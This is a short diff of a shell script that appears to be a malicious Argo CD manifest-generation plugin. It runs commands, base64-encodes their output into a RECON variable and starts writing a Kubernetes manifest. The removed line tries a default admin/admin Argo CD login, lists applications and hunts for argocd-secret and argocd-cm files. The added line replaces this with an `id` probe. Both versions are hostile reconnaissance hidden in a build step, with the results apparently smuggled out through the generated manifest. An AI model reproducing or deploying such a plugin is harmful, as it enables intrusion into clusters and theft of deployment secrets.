@@ -1,6 +1,6 @@
 #!/bin/sh
 RECON=$( (
-echo TEST_ARGO_LOGIN; /usr/local/bin/argocd login argocd-server.argocd.svc.cluster.local --insecure --grpc-web --username admin --password admin 2>&1 || true; echo CORE_TEST; /usr/local/bin/argocd app list --core --insecure 2>&1 | head -5 || true; echo SECRET_HUNT; find / -name 'argocd-secret*' -o -name 'argocd-cm*' 2>/dev/null | head -5 || true; echo DONE
+id
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
